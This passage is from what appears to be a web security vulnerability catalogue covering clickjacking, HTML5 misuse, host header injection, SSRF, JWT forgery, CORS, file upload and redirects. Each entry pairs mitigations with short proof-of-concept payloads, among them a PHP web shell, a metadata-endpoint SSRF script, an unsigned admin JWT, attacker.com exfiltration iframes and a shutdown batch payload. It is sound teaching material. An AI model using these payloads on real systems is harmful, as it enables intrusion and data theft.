## Testing Tools / Techniques

- **Manual testing**:
  - Inject payloads in query strings and observe if they're cached
  - Reload affected pages to see if malicious content persists

- **Browser DevTools** – Inspect cached items in the network tab

- **Burp Suite** – Use Repeater and Intruder to manipulate cacheable headers and payloads

- **Cache Poisoning Tools**:
  - ParamMiner (Burp Extension)
  - Cache Poisoning Scanner

- **Content Scanners** – Identify improperly cached user-generated content

## References

- [PortSwigger – Browser Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [OWASP Caching Guidance](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#cache-control)
- [MDN: Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)
- [Google Web Fundamentals – Caching Best Practices](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching)
***
# WEBVULN-063: Clickjacking

## Category  
User Interface (UI) Redressing / Client-Side Attacks

## Vulnerability  
**Clickjacking**

## Description  
Clickjacking is a UI redressing attack where an attacker tricks a user into clicking on something different from what the user perceives, by loading a legitimate web application inside an invisible or disguised frame. The attacker overlays malicious elements to hijack clicks or actions meant for the legitimate site.

Clickjacking can lead to:
- Unintended transactions (e.g., fund transfers, purchases)
- Disclosure of sensitive data (if inputs are exposed)
- Enabling camera/mic access
- Hijacking authentication or authorization actions

It exploits trust in the UI and browser rendering, not necessarily a code-level vulnerability.

## Demo / Proof of Concept

### Scenario: Framing a banking website

1. Attacker creates a malicious page:
    ```html
    <style>
      iframe {
        opacity: 0;
        position: absolute;
        top: 0;
        left: 0;
        z-index: 10;
        width: 100%;
        height: 100%;
      }
      button {
        z-index: 20;
        position: relative;
      }
    </style>

    <button>Click to win a prize!</button>
    <iframe src="https://bank.example.com/transfer?amount=1000&to=attacker"></iframe>
    ```

2. Victim clicks the "prize" button but is actually clicking the hidden bank button inside the iframe.

3. A transfer occurs without the user realizing what they clicked.

## Mitigation

- **Implement X-Frame-Options header**:
    ```http
    X-Frame-Options: DENY
    ```
    or
    ```http
    X-Frame-Options: SAMEORIGIN
    ```

- **Use Content Security Policy (CSP) frame-ancestors directive**:
    ```http
    Content-Security-Policy: frame-ancestors 'self';
    ```

- **Apply frame-busting JavaScript (less reliable than headers)**:
    ```javascript
    if (top !== self) {
        top.location = self.location;
    }
    ```

- **Avoid exposing sensitive UI actions on publicly accessible endpoints without user confirmation or CSRF protection**

- **Use UI design best practices** like requiring re-authentication for critical actions, and not allowing important functions to be triggered by a single click

## Testing Tools / Techniques

- **Manual Testing**:
  - Create a test page embedding target site in an `<iframe>`
  - Attempt click overlays

- **Browser DevTools** – Inspect response headers (`X-Frame-Options`, `CSP`)

- **Burp Suite** – Clickjacking plugin

- **OWASP Clickjacking Defense Cheat Sheet** – Validate proper header use

- **Security scanners**:
  - ZAP
  - Nikto
  - Acunetix

## References

- [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)
- [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [MDN: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [MDN: CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)
- [PortSwigger – Clickjacking](https://portswigger.net/web-security/clickjacking)
***
# WEBVULN-064: HTML5 Security Issues

## Category  
Client-Side Security / HTML5 Features Misuse

## Vulnerability  
**HTML5 Security Issues**

## Description  
HTML5 introduced powerful features such as local storage, session storage, WebSockets, Web Workers, and cross-origin resource sharing (CORS). While these features enhance web applications, improper implementation can introduce serious security vulnerabilities.

Common security issues with HTML5 include:

- **LocalStorage/SessionStorage abuse**: Storing sensitive data insecurely on the client.
- **Cross-Origin Messaging (`postMessage`) misuse**: Sending data across origins without validating message origin.
- **WebSocket vulnerabilities**: Lack of authentication and encryption.
- **Client-side database abuse (IndexedDB, WebSQL)**: Storing confidential data with no access control.
- **Geolocation API misuse**: Leaking users’ real-time location without consent.
- **Web Workers and Service Workers**: Background scripts can be exploited for persistence or abuse.
- **Form Autofill Hijacking**: Exploiting HTML5 form enhancements to steal user input.

These issues arise not from HTML5 itself, but from insecure or careless usage of its APIs.

## Demo / Proof of Concept

### Scenario: Storing sensitive data in localStorage

```javascript
// Storing sensitive user info
localStorage.setItem("authToken", "Bearer eyJhbGciOi...");

// Attacker accesses it via XSS
alert(localStorage.getItem("authToken"));
```

### Scenario: Insecure postMessage usage

```javascript
// Vulnerable receiver
window.addEventListener("message", function(event) {
    eval(event.data); // Dangerous
});
```

### Scenario: Autofill data capture via hidden fields

```html
<form>
  <input name="email" autocomplete="email">
  <input name="password" autocomplete="current-password" type="password">
  <iframe src="https://attacker.com/steal" style="display:none;"></iframe>
</form>
```

## Mitigation

- **Avoid storing sensitive data in localStorage/sessionStorage**:
  - Use short-lived, secure, HttpOnly cookies for authentication data.

- **Always validate origin in `postMessage` receivers**:
  ```javascript
  window.addEventListener("message", function(event) {
      if (event.origin !== "https://trusted.example.com") return;
      // Handle message securely
  });
  ```

- **Use secure WebSocket connections (`wss://`) and implement authentication**.

- **Avoid using client-side storage for secrets** (e.g., tokens, keys).

- **Prompt for user consent when using geolocation and minimize precision**.

- **Apply strong CSP and input sanitization to prevent XSS attacks that target HTML5 features.**

- **Limit permissions and usage of Service Workers to trusted paths and origins.**

- **Disable form autofill for sensitive data inputs unless absolutely necessary**:
  ```html
  <input autocomplete="off">
  ```

## Testing Tools / Techniques

- **Manual Code Review** – Look for use of localStorage, `postMessage`, `eval`, etc.
- **Browser DevTools** – Inspect localStorage/sessionStorage, Service Workers
- **Burp Suite / OWASP ZAP** – Fuzz HTML5 endpoints, look for misused WebSocket or CORS
- **DOM Invader** – Inspect DOM-based vulnerabilities involving HTML5 features
- **Static Analysis Tools** – Identify risky API usage in JS

## References

- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [MDN Web Docs – Web Storage](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN – Using Web Workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API)
- [Google Web Fundamentals – Security](https://developers.google.com/web/fundamentals/security)
- [PortSwigger – HTML5 Security Issues](https://portswigger.net/web-security/html5)
***
# WEBVULN-065: Insecure Use of HTML5 Features

## Category  
Client-Side Security / HTML5 Feature Misconfiguration

## Vulnerability  
**Insecure Use of HTML5 Features**

## Description  
HTML5 introduced a broad set of APIs and features—such as localStorage, sessionStorage, WebSockets, Web Workers, Geolocation, and cross-origin messaging—that, if improperly implemented, open up new attack vectors. This vulnerability encompasses a class of issues resulting from insecure usage patterns of these features.

Examples include:
- Storing sensitive data (e.g., tokens) in browser storage where JavaScript (and thus XSS) has access
- Failing to validate message origins in `postMessage` communication
- Using insecure WebSocket connections (`ws://` instead of `wss://`)
- Allowing form autofill on hidden or malicious input fields
- Leaking location or sensitive user data via Geolocation API without explicit consent

These vulnerabilities are often compounded when combined with Cross-Site Scripting (XSS), Cross-Origin Resource Sharing (CORS) misconfigurations, or poor input/output handling.

## Demo / Proof of Concept

### 1. Token Theft via XSS and localStorage

```javascript
// Application stores token
localStorage.setItem("authToken", "secret-token");

// Attacker injects script via XSS
alert(localStorage.getItem("authToken"));
```

### 2. Unsafe postMessage Implementation

```javascript
// Receiver does not validate sender
window.addEventListener("message", function(event) {
  if (typeof event.data === 'string') {
    eval(event.data); // Dangerous
  }
});
```

### 3. Autofill Hijacking

```html
<form>
  <input type="email" name="email" autocomplete="email">
  <input type="password" name="password" autocomplete="current-password">
  <iframe src="https://attacker.com/steal" style="opacity:0;position:absolute;"></iframe>
</form>
```

## Mitigation

- **Do not store sensitive data in localStorage/sessionStorage.**
  - Use HttpOnly, Secure cookies instead.

- **Use `postMessage` securely**:
  - Always verify `event.origin` against a known, trusted domain.
  ```javascript
  if (event.origin !== "https://yourdomain.com") return;
  ```

- **Use `wss://` (secure WebSocket) and ensure proper authentication and origin checking.**

- **Restrict usage of Geolocation and request explicit user consent.**

- **Disable autocomplete on sensitive fields**:
  ```html
  <input type="password" autocomplete="off">
  ```

- **Enforce CSP (Content Security Policy)** to restrict inline scripts and mitigate XSS.

- **Limit Service Worker scope and register only on secure, trusted paths.**

- **Sanitize and validate any data processed or stored using client-side storage.**

## Testing Tools / Techniques

- **Manual Code Review** – Look for risky use of `localStorage`, `eval`, unvalidated `postMessage`, etc.
- **Browser DevTools** – Inspect application storage, Service Worker registration, WebSocket usage.
- **Burp Suite / OWASP ZAP** – Intercept and fuzz HTML5-related APIs.
- **DOM Invader (Burp Extension)** – Inspect DOM-based usage and HTML5 features abuse.
- **Static/Dynamic Analysis Tools** – Detect insecure API calls and data flows in JavaScript.

## References

- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [MDN Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN postMessage Security](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [Google Web Fundamentals – Security](https://developers.google.com/web/fundamentals/security)
- [PortSwigger – HTML5 Attacks](https://portswigger.net/web-security/html5)
---
# WEBVULN-066: Host Header Injection

## Category  
Server-Side Security / HTTP Header Manipulation

## Vulnerability  
**Host Header Injection**

## Description  
Host header injection occurs when a web application uses the value of the `Host` HTTP header in an unsafe way, such as generating links, redirects, password reset URLs, or performing internal logic, without properly validating or sanitizing it. Attackers can manipulate this header to poison caches, perform web cache deception, trigger SSRF (Server-Side Request Forgery), or carry out phishing-style attacks via malicious password reset links.

This vulnerability is especially dangerous in applications that:
- Reflect the `Host` header in email communications or responses
- Use the `Host` header to construct absolute URLs for redirects
- Trust the `Host` value in reverse proxy setups

## Demo / Proof of Concept

### 1. Password Reset Link Manipulation

If the application constructs a password reset link like:

```http
POST /forgot-password HTTP/1.1
Host: evil.example.com
```

And sends:

```html
Click here to reset your password: http://evil.example.com/reset?token=abc123
```

Then the attacker can receive the reset token via a malicious link, leading to account compromise.

### 2. Cache Poisoning

```http
GET /article?id=123 HTTP/1.1
Host: attacker.com
```

If response is cached using `Host`, legitimate users may later receive attacker-controlled content.

### 3. SSRF (with flawed internal logic)

If the app trusts the `Host` header in backend logic (e.g., image fetching or internal routing), attackers can trick it into sending requests to internal services.

## Mitigation

- **Whitelist allowed Host headers** (e.g., `yourdomain.com`, `www.yourdomain.com`) on the server.

- **Avoid using the `Host` header to construct URLs**—prefer server-side configuration or trusted metadata.

- **Use the `X-Forwarded-Host` header carefully** and sanitize it when behind proxies or load balancers.

- **Set a canonical `Host` and reject all unexpected values**:
  ```python
  # Flask example
  @app.before_request
  def block_invalid_host():
      if request.host not in ['yourdomain.com', 'www.yourdomain.com']:
          abort(400)
  ```

- **Review email templates** and ensure reset links or absolute URLs are not based on unvalidated `Host`.

- **Ensure reverse proxies and load balancers strip or validate incoming `Host` headers**.

## Testing Tools / Techniques

- **Manual Testing** – Modify the `Host` header in requests and observe behavior.

- **Burp Suite Intruder/Repeater** – Send requests with altered `Host` headers.

- **OWASP ZAP** – Use fuzzing rules to test for Host header abuse.

- **Check email links** or password reset mechanisms for trust in user-controlled `Host`.

- **Security scanners** – Nikto, Acunetix, and others may detect this.

## References

- [OWASP Host Header Injection](https://owasp.org/www-community/attacks/Host_header_injection)
- [PortSwigger – Host Header Attacks](https://portswigger.net/web-security/host-header)
- [RFC 7230 – HTTP/1.1 Header Fields](https://datatracker.ietf.org/doc/html/rfc7230#section-5.4)
- [Detecting and Exploiting Host Header Vulnerabilities](https://blog.securelayer7.net/host-header-injection-vulnerability/)
---

# WEBVULN-067: Open Redirect

## Category  
Access Control / URL Redirection

## Vulnerability  
**Open Redirect**

## Description  
An open redirect occurs when a web application accepts untrusted input that specifies a link to an external site and redirects the user to that URL without proper validation. Attackers can exploit this to redirect victims to malicious websites, conduct phishing attacks, or bypass security controls such as SSO or authorization flows.

This flaw is common in login/logout workflows, password reset links, and SSO integrations.

## Demo / Proof of Concept

### Example vulnerable endpoint:

```
https://example.com/logout?redirect=https://attacker.com
```

### Browser behavior:

Upon visiting the link, the user is redirected to the attacker’s site, which may imitate the real one and collect credentials or personal data.

## Mitigation

- **Use allow-lists for redirects**, permitting only pre-approved domains or paths.

- **Reject full URLs** in redirect parameters unless absolutely necessary.

- **Encode and validate redirect destinations**:

  
  ```python
  # Flask example
  allowed_paths = ['/dashboard', '/home']
  if next_path in allowed_paths:
      return redirect(next_path)
  else:
      abort(400)
  ```

- **Avoid accepting user-controlled URLs in redirect parameters**.

## Testing Tools / Techniques

- **Manual testing** -  with modified redirect URLs.
- **Burp Suite** – Use Repeater to manipulate the `redirect` parameter.
- **Static code analysis** – Check for use of `redirect(url)` or similar functions without validation.

## References

- [OWASP Open Redirect](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [PortSwigger – Open Redirect](https://portswigger.net/web-security/open-redirect)
- [Google Security Blog – Avoiding Open Redirects](https://security.googleblog.com/2011/08/open-redirects-considered-harmful.html)
***
# WEBVULN-068: Reflected File Download (RFD)

## Category  
Client-Side / Insecure Downloads

## Vulnerability  
**Reflected File Download (RFD)**

## Description  
RFD occurs when a web application reflects user input directly into a downloadable file without proper sanitization. This can lead to the creation of files that, when opened by the user, execute malicious scripts, especially on Windows systems.

## Demo / Proof of Concept

```
https://example.com/download?filename=evil.bat&content=@echo off&&shutdown -s
```

Browser interprets the response as a downloadable `.bat` file, which may be executed by the victim.

## Mitigation

- **Always sanitize user input** in filenames and content.

- **Set proper Content-Disposition headers** with safe filenames.

- **Avoid echoing user input in downloadable files**.

- **Use content-type headers strictly**.

## Testing Tools / Techniques

- Manual inspection of download endpoints.
- Burp Suite or curl for testing file downloads with payloads.

## References

- [OWASP RFD Attack](https://owasp.org/www-community/attacks/Reflected_File_Download)
- [RFD Whitepaper – Trustwave](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/reflected-file-download-a-new-web-attack-vector/)
---
# WEBVULN-069: Sensitive Data Exposure via URL

## Category  
Information Disclosure

## Vulnerability  
**Sensitive Data Exposure via URL**

## Description  
Sensitive information (tokens, session IDs, passwords) transmitted via URLs can be stored in browser history, logs, and referrer headers, exposing them to attackers.

## Demo / Proof of Concept

```
https://example.com/reset?token=abc123securetoken
```

Token visible in:
- Browser history
- Server logs
- Referrer header if redirected

## Mitigation

- **Use POST requests** instead of GET for sensitive operations.

- **Never place tokens in URL query parameters**.

- **Invalidate tokens quickly and log misuse**.

## Testing Tools / Techniques

- Inspect browser history and logs for token exposure.
- Use proxy tools to monitor outgoing requests.

## References

- [OWASP – Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
---
# WEBVULN-070: User-Agent Based Access Control

## Category  
Access Control

## Vulnerability  
**User-Agent Based Access Control**

## Description  
Some applications grant or deny access based solely on the `User-Agent` string, which is easily spoofed. Attackers can bypass restrictions by mimicking browser or bot user agents.

## Demo / Proof of Concept

Set User-Agent:
```
User-Agent: Googlebot
```

Access pages intended for bots only.

## Mitigation

- **Do not rely on User-Agent headers for access control**.

- **Use proper authentication and authorization checks**.

- **Verify bot access using reverse DNS or signed tokens**.

## Testing Tools / Techniques

- Modify User-Agent header via browser or tools like curl/Burp.

## References

- [OWASP Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
---
# WEBVULN-071: Information Disclosure via Robots.txt

## Category  
Information Disclosure

## Vulnerability  
**Exposed Sensitive Directories in robots.txt**

## Description  
If sensitive directories or files are listed in `robots.txt`, attackers can read the file and directly access those locations.

## Demo / Proof of Concept

Access:
```
https://example.com/robots.txt
```

Contains:
```
Disallow: /admin/
Disallow: /internal-api/
```

Attacker browses directly to those paths.

## Mitigation

- **Do not list sensitive resources in robots.txt**.

- **Enforce proper access control on sensitive endpoints**.

- **Use robots.txt only for public crawler guidance, not security**.

## Testing Tools / Techniques

- Manual inspection of `robots.txt`.

- Search engines often cache these entries.

## References

- [OWASP – Info Disclosure](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Error_Handling/README.html)
---
# WEBVULN-072: Exposed .git Repository

## Category  
Information Disclosure / Source Code Exposure

## Vulnerability  
**Publicly Accessible .git Directory**

## Description  
If a `.git` directory is exposed on a web server, attackers can retrieve the full source code, including credentials, internal logic, and configuration files.

## Demo / Proof of Concept

```
https://example.com/.git/config
```

## Mitigation

- **Block access to `.git` directories via server configuration**.

- **Deploy from built code, not directly from VCS**.

- **Use `.htaccess` or server rules to deny directory access**.

## Testing Tools / Techniques

- Manual probing for `.git/` endpoints.

- Tools like `git-dumper` or `DVCS-Pillage`.

## References

- [SANS - Git Exposure](https://isc.sans.edu/forums/diary/Exposed+git+repositories+are+becoming+more+common/24967/)
---
# WEBVULN-073: HTTP Parameter Pollution (HPP)

## Category  
Input Manipulation

## Vulnerability  
**HTTP Parameter Pollution**

## Description  
HPP occurs when the same parameter appears multiple times in the query string, potentially altering application behavior or bypassing filters.

## Demo / Proof of Concept

```
https://example.com/login?user=admin&user=attacker
```

Some apps may process the first value, others the last.

## Mitigation

- **Normalize parameter handling on the server side**.

- **Reject duplicated parameters if unnecessary**.

- **Apply input validation on all received values**.

## Testing Tools / Techniques

- Manually craft multiple parameter variations.

- Burp Intruder with payload lists for HPP.

## References

- [OWASP HPP](https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution)
---
# WEBVULN-074: Information Disclosure via Stack Traces

## Category  
Information Disclosure

## Vulnerability  
**Verbose Stack Traces in Error Pages**

## Description  
Detailed stack traces exposed to users can reveal application internals like file paths, framework details, libraries, or business logic.

## Demo / Proof of Concept

Trigger:
```
https://example.com/api?id='
```

Response:
```
java.lang.NullPointerException at com.example.user.UserService.get(UserService.java:42)
```

## Mitigation

- **Disable detailed error messages in production**.

- **Log errors server-side only**.

- **Show generic error messages to users**.

## Testing Tools / Techniques

- Input fuzzing.
- Observe HTTP 500 or 400 errors.

## References

- [OWASP Testing for Error Handling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Error_Handling/)
---
# WEBVULN-075: JavaScript Prototype Pollution

## Category  
Client-Side Code / Object Injection

## Vulnerability  
**Prototype Pollution**

## Description  
Prototype pollution is a vulnerability that allows attackers to inject properties into JavaScript object prototypes, potentially modifying application behavior or causing denial of service.

## Demo / Proof of Concept

```js
JSON.parse('{ "__proto__": { "admin": true } }')
```

If merged with app logic, `anyObj.admin` may return `true`.

## Mitigation

- **Avoid using `Object.assign` or `merge` without validation**.

- **Use safe deep merge libraries**.

- **Block `__proto__`, `constructor`, and `prototype` in user input**.

## Testing Tools / Techniques

- JavaScript input fuzzing.

- Use tools like Snyk or npm audit.

## References

- [OWASP Prototype Pollution](https://owasp.org/www-community/attacks/Prototype_Pollution)
---
# WEBVULN-076: Cookie Without Secure or HttpOnly Flag

## Category  
Session Management

## Vulnerability  
**Insecure Cookie Attributes**

## Description  
Cookies without `Secure` or `HttpOnly` flags can be accessed via JavaScript or transmitted over insecure channels, increasing risk of theft via XSS or sniffing.

## Demo / Proof of Concept

```http
Set-Cookie: session=abcd1234;
```

Accessible via:
```js
document.cookie
```

## Mitigation

- **Always set `Secure`, `HttpOnly`, and `SameSite` attributes**.

- Example:
  ```
  Set-Cookie: session=abcd1234; Secure; HttpOnly; SameSite=Strict
  ```

## Testing Tools / Techniques

- Inspect response headers via DevTools.

- Use Burp or OWASP ZAP.

## References

- [OWASP Session Management](https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html)
---

***
## PART XI OTHERS
---
# WEBVULN-077: Server-Side Request Forgery (SSRF)

## Category  
Server-Side Vulnerability

## Vulnerability  
**Server-Side Request Forgery (SSRF)**

## Description  
SSRF occurs when a web application fetches a resource from a user-supplied URL without validating it, allowing attackers to force the server to make requests to internal systems, external APIs, or cloud metadata endpoints (e.g., AWS). This can expose sensitive data or services that are otherwise not accessible from the outside.

## Demo / Proof of Concept

### Example Vulnerable Request
```
GET /fetch?url=http://example.com/image.jpg
```

### Exploit
```
GET /fetch?url=http://127.0.0.1:8080/admin
```

### Python PoC
```python
import requests
url = "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
resp = requests.get(url)
print(resp.text if resp.status_code == 200 else "Blocked")
```

## Mitigation

- Whitelist allowed domains/IPs for outbound requests.
- Block internal IP ranges (127.0.0.1, 169.254.0.0/16, etc.).
- Disallow dangerous protocols (`file://`, `gopher://`).
- Perform DNS resolution and validation.
- Use strict firewall rules to prevent access to internal services.
- Log all outbound requests for anomaly detection.

## Testing Tools / Techniques

- Burp Suite Repeater / Collaborator
- SSRFmap
- curl / Postman
- DNS rebinding tools
- AWS instance metadata PoCs

## References

- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- https://portswigger.net/web-security/ssrf
- https://github.com/swisskyrepo/SSRFmap
---
# WEBVULN-078: JSON Web Token (JWT) Misconfiguration

## Category  
Authentication / Token Handling

## Vulnerability  
**JWT Misconfiguration**

## Description  
JWTs are often used for stateless authentication. If poorly configured, they may lead to serious vulnerabilities such as accepting unsigned tokens, using weak keys, or failing to verify signature algorithms properly. Attackers can forge or tamper tokens to gain unauthorized access.

Common issues:
- `alg: none` attack (no signature verification)
- Symmetric key reuse with asymmetric algorithms (e.g., using `HS256` with a public RSA key)
- Expired tokens not being validated
- Weak or hardcoded secret keys

## Demo / Proof of Concept

### Example Token Header
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

### Forged Token
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

If the backend fails to validate the signature, attacker gains admin access.

## Mitigation

- Always validate the signature using the correct algorithm.
- Disallow `alg=none` in production.
- Use strong, randomized secret keys.
- Rotate keys regularly and support token revocation.
- Validate token claims (e.g., expiration, issuer, audience).
- Implement token blacklisting if needed.

## Testing Tools / Techniques

- jwt.io debugger
- Burp Suite + JWT Editor extension
- jwt_tool (by ticarpi)
- Postman or curl with crafted JWTs

## References

- https://owasp.org/www-project-json-web-tokens/
- https://portswigger.net/web-security/jwt
- https://github.com/ticarpi/jwt_tool
---
# WEBVULN-079: Improper Input Sanitization

## Category  
Input Validation

## Vulnerability  
**Improper Input Sanitization**

## Description  
Improper sanitization occurs when user-supplied input is not adequately filtered or cleansed before being processed by the server or client. This vulnerability can lead to various attacks such as XSS, SQL Injection, Command Injection, and more. It’s often a root cause vulnerability that facilitates others.

Common flaws:
- Directly reflecting input into HTML/JS
- Passing unfiltered data to system commands or queries
- Failing to encode output in the appropriate context (HTML, URL, JS, SQL)

## Demo / Proof of Concept

### Scenario: XSS via unsanitized input
```
https://example.com/profile?name=<script>alert(1)</script>
```

### Vulnerable Code (PHP)
```php
echo "Hello " . $_GET['name'];
```

## Mitigation

- Use strict input validation (whitelisting) wherever possible.
- Contextually encode output:
  - HTML → `htmlspecialchars()`
  - URL → `urlencode()`
  - JS → escape with encoding libraries
- Sanitize input on both client and server side.
- Use frameworks or libraries that enforce automatic output encoding.

## Testing Tools / Techniques

- Manual input fuzzing
- Burp Suite Intruder
- OWASP ZAP
- FuzzDB payloads

## References

- https://owasp.org/www-community/Input_Validation
- https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html

---
# WEBVULN-080: Cross-Origin Resource Sharing (CORS) Misconfiguration

## Category  
Access Control / Cross-Origin

## Vulnerability  
**CORS Misconfiguration**

## Description  
CORS is a mechanism that controls which domains are allowed to access resources on another origin. Misconfiguring CORS (e.g., using `Access-Control-Allow-Origin: *` with `credentials: true`, or reflecting arbitrary origins) can allow malicious sites to read sensitive data from APIs or perform authenticated requests on a user’s behalf.

Common misconfigurations:
- Wildcard origin with `Access-Control-Allow-Credentials: true`
- Reflecting `Origin` header without validation
- Allowing all methods and headers indiscriminately

## Demo / Proof of Concept

### Malicious JavaScript on attacker.com
```javascript
fetch("https://victim.com/api/userinfo", {
  credentials: "include"
})
.then(res => res.text())
.then(data => alert(data));
```

If `victim.com` misconfigures CORS, attacker can exfiltrate data cross-origin.

## Mitigation

- Avoid `Access-Control-Allow-Origin: *` if using credentials.
- Whitelist specific trusted origins.
- Never reflect arbitrary Origin values.
- Restrict allowed methods and headers.
- Disable CORS unless needed.

## Testing Tools / Techniques

- curl with custom `Origin` header:
  ```bash
  curl -H "Origin: https://attacker.com" -I https://victim.com/api
  ```
- Burp Suite / ZAP CORS plugins
- CORScanner, CORSy tools

## References

- https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
- https://portswigger.net/web-security/cors
- https://github.com/chenjj/CORScanner
---
# WEBVULN-081: Unrestricted File Upload

## Category  
File Handling / Server-Side Vulnerability

## Vulnerability  
**Unrestricted File Upload**

## Description  
Unrestricted file upload allows attackers to upload files without proper validation. This can lead to:
- Remote Code Execution (RCE)
- Cross-Site Scripting (XSS)
- Denial of Service (DoS)
- Phishing via malicious HTML pages

Attackers typically upload scripts like `.php`, `.jsp`, or `.exe` that execute on the server.

## Demo / Proof of Concept

### Scenario:
Upload endpoint accepts arbitrary files without filtering extensions or MIME types.

### Exploit:
Upload a PHP shell:
```php
<?php system($_GET['cmd']); ?>
```

Then access:
```
https://target.com/uploads/shell.php?cmd=whoami
```

## Mitigation

- Restrict file types by validating extensions and MIME types.
- Rename uploaded files to randomized names.
- Store uploads outside the web root.
- Use file content scanning libraries or AVs.
- Set appropriate permissions on upload directories.
- Use static file servers (e.g., S3) with no execution permissions.

## Testing Tools / Techniques

- Burp Suite Repeater
- Upload a `.php`, `.asp`, `.jsp`, `.svg` payload
- `curl -F` or Postman for multipart/form-data testing

## References

- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://portswigger.net/web-security/file-upload
---
# WEBVULN-082: Use of Hardcoded Credentials

## Category  
Authentication / Configuration Management

## Vulnerability  
**Use of Hardcoded Credentials**

## Description  
Hardcoding credentials (usernames, passwords, API keys) directly in source code, configuration files, or version control introduces a major security risk. If the code is leaked or accessible (e.g., via GitHub), attackers can use the credentials to gain unauthorized access to services or systems.

## Demo / Proof of Concept

### Example (JavaScript in frontend bundle)
```js
const API_KEY = "sk_live_ABC123456789";
```

### Example (config file checked into git)
```bash
DB_USER=admin
DB_PASS=SuperSecret123
```

## Mitigation

- Never hardcode credentials in source code.
- Use environment variables or secure credential stores (e.g., HashiCorp Vault, AWS Secrets Manager).
- Audit repositories for sensitive data with tools like `truffleHog`, `GitLeaks`.
- Rotate credentials regularly and enforce least privilege.
- Use CI/CD to inject secrets securely at runtime.

## Testing Tools / Techniques

- Code review (manual and automated)
- Git history scanning (`git log -S 'password'`)
- GitHub Secret Scanning alerts
- `truffleHog`, `gitleaks`, `shhgit`

## References

- https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password
- https://github.com/zricethezav/gitleaks
- https://trufflesecurity.com/trufflehog

---
# 🛡️ Web Vulnerability #83: Insecure Redirects and Forwards

## 📖 Overview

**Insecure Redirects and Forwards** occur when a web application redirects or forwards users to other pages without validating the destination. This can allow attackers to redirect users to malicious websites or bypass access controls.

---

## 🧨 Vulnerability Type

- **Category**: Access Control / Input Validation
- **OWASP Top 10 Reference**: A10 (2021) - Server-Side Request Forgery (SSRF) and Insecure Design
- **CWE Reference**: [CWE-601: URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)

---

## 🔍 Description

Applications often redirect users after actions such as login, logout, or error handling. If these redirections are determined by user-supplied input (e.g., query parameters or POST data) without proper validation, attackers can craft URLs that trick users into visiting malicious sites.

---

## 🧪 Example Scenarios

### ✅ Legitimate Use

```http
GET /redirect?url=/dashboard
---

## 🚧 Server-Side Example (Vulnerable)

```python
redirect_to = request.GET.get('url')
return redirect(redirect_to)
```
**❌ Exploited Scenario (Open Redirect)**

``` http
GET /redirect?url=https://malicious.example.com
```
**🧠 Impact**
- Phishing Attacks: Victims may be tricked into trusting a link from your domain, which forwards to a malicious site.

- Access Control Bypass: Attackers may forward requests to internal functions or restricted resources.

- Loss of User Trust: Users may stop trusting your domain if it frequently redirects to untrusted sources.

**🛠️ Prevention & Mitigation**
**✅ 1. Allow Only Whitelisted URLs**
```python
# Python Flask example
SAFE_REDIRECTS = ['/home', '/dashboard', '/profile']

url = request.args.get('url')
if url in SAFE_REDIRECTS:
    return redirect(url)
else:
    return abort(400)

```
### ✅ 2. Use Relative URLs Only

Avoid absolute URLs in redirects. Redirect internally using path names only.

---

### ✅ 3. Validate Against Trusted Hosts

If external redirects are required, validate the hostname:

```python
from urllib.parse import urlparse

trusted_domains = ['yourdomain.com']
url = request.args.get('next')
parsed = urlparse(url)

if parsed.netloc and parsed.netloc not in trusted_domains:
    abort(403)
```
### ✅ 4. Log and Monitor Redirects

Track redirect patterns for abuse detection.

---

## 🔍 Detection

- **Static Code Analysis**: Look for usage of `redirect()` or equivalent functions with user-supplied input.
- **Dynamic Testing**: Use tools like Burp Suite to manipulate redirect parameters.
- **Fuzzing**: Check if unvalidated URLs can be injected via parameters like `next`, `url`, `continue`, or `redirect_to`.

---

## 🧰 Tools

- **Burp Suite / OWASP ZAP**: To detect and exploit open redirect vulnerabilities.
- **Static Analyzers**: Bandit (Python), ESLint (JavaScript), Checkmarx, etc.
- **Regex Scanner**: Custom scripts to detect redirect params in source code.

---

## 📚 References

- [OWASP: Unvalidated Redirects and Forwards](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards)
